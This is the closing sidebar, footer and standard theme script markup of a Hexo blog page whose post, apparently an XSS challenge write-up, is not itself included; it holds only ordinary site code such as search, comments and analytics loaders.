+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">findneo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">73</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/findneo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="javascript:alert(atob('ZGZpbmRuZW9AZ21haWwuY29t'))" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/findne0" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctftime.org/event/list/upcoming" title="CTFtime" target="_blank">CTFtime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lm0963.github.io/" title="Lm0963" target="_blank">Lm0963</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.lzhtony.com" title="lzhtony" target="_blank">lzhtony</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ph0en1x.com/" title="Ph0en1x-Team" target="_blank">Ph0en1x-Team</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Level1"><span class="nav-number">1.</span> <span class="nav-text">Level1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level2"><span class="nav-number">2.</span> <span class="nav-text">Level2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level3"><span class="nav-number">3.</span> <span class="nav-text">Level3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level4"><span class="nav-number">4.</span> <span class="nav-text">Level4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level5"><span class="nav-number">5.</span> <span class="nav-text">Level5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level6"><span class="nav-number">6.</span> <span class="nav-text">Level6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level7"><span class="nav-number">7.</span> <span class="nav-text">Level7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level8"><span class="nav-number">8.</span> <span class="nav-text">Level8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level9"><span class="nav-number">9.</span> <span class="nav-text">Level9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level10"><span class="nav-number">10.</span> <span class="nav-text">Level10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level11"><span class="nav-number">11.</span> <span class="nav-text">Level11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level12"><span class="nav-number">12.</span> <span class="nav-text">Level12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level13"><span class="nav-number">13.</span> <span class="nav-text">Level13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level16"><span class="nav-number">14.</span> <span class="nav-text">Level16</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://findneo.github.io/180405XSSTVChallenge/';
+          this.page.identifier = '180405XSSTVChallenge/';
+          this.page.title = 'xss.tv挑战赛';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://findneo.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>
+
+
+  
+
+</body>
+</html>
